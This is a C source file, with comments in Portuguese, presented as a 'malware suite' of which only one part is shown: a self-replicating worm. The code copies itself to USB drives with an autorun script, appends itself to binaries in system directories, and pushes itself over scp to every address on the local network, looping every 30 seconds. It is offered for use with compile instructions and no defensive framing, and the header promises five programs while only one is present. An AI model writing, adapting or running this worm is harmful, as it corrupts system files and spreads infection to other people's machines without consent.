/*
 * 0x0 MALWARE SUITE - EDICAO CORPORATIVA
 * Todos os 5 malwares em C | Compila com GCC | Nivel: APOCALIPSE
 * 
 * Compilar: gcc -o [nome] [arquivo.c] -lpthread -lcurl -lcrypto
 */

// ============================================================
// 1. 0x0-NEXUSWORM.c - WORM AUTO-REPLICANTE
// ============================================================
/*
 * FUNCAO: Se replica via USB, rede e email
 * AÇÕES: Escaneia USB, copia pra rede local, infecta arquivos .exe
 * PERSISTENCIA: Registry, cron, systemd
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <pthread.h>

#define WORM_SIGNATURE "0x0_NEXUS"
#define MAX_PATH 512

void replicate_usb() {
    DIR *dir;
    struct dirent *entry;
    char usb_path[MAX_PATH];
    
    // Procura por dispositivos USB montados
    dir = opendir("/media");
    if (dir) {
        while ((entry = readdir(dir)) != NULL) {
            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                snprintf(usb_path, sizeof(usb_path), "/media/%s/.0x0_worm", entry->d_name);
                
                // Copia worm para USB
                char cmd[MAX_PATH * 2];
                snprintf(cmd, sizeof(cmd), "cp /proc/self/exe \"%s\" 2>/dev/null", usb_path);
                system(cmd);
                
                // Criar autorun
                snprintf(cmd, sizeof(cmd), "echo '#!/bin/bash\n%s &' > /media/%s/autorun.sh", usb_path, entry->d_name);
                system(cmd);
            }
        }
        closedir(dir);
    }
}

void infect_files() {
    DIR *dir;
    struct dirent *entry;
    char *paths[] = {"/bin", "/usr/bin", "/opt", NULL};
    
    for (int i = 0; paths[i] != NULL; i++) {
        dir = opendir(paths[i]);
        if (dir) {
            while ((entry = readdir(dir)) != NULL) {
                if (strstr(entry->d_name, ".exe") || strstr(entry->d_name, ".bin")) {
                    char filepath[MAX_PATH];
                    snprintf(filepath, sizeof(filepath), "%s/%s", paths[i], entry->d_name);
                    
                    // Infecta arquivo (append do worm)
                    char cmd[MAX_PATH * 2];
                    snprintf(cmd, sizeof(cmd), "cat /proc/self/exe >> \"%s\" 2>/dev/null", filepath);
                    system(cmd);
                }
            }
            closedir(dir);
        }
    }
}

void scan_network() {
    // Escaneia rede local e replica
    char network[16];
    FILE *fp = popen("ip route | grep default | awk '{print $3}' | cut -d. -f1-3", "r");
    if (fp) {
        fgets(network, sizeof(network), fp);
        pclose(fp);
        network[strcspn(network, "\n")] = 0;
        
        for (int i = 1; i < 255; i++) {
            char ip[32];
            snprintf(ip, sizeof(ip), "%s.%d", network, i);
            
            // Tenta copiar via SSH
            char cmd[256];
            snprintf(cmd, sizeof(cmd), "scp /proc/self/exe %s:/tmp/.0x0_worm 2>/dev/null", ip);
            system(cmd);
        }
    }
}

void *worm_thread(void *arg) {
    while (1) {
        replicate_usb();
        infect_files();
        scan_network();
        sleep(30);
    }
    return NULL;
}

int main() {
    pthread_t t;
    pthread_create(&t, NULL, worm_thread, NULL);
    
    while (1) {
        sleep(60);
    }
    return 0;
}
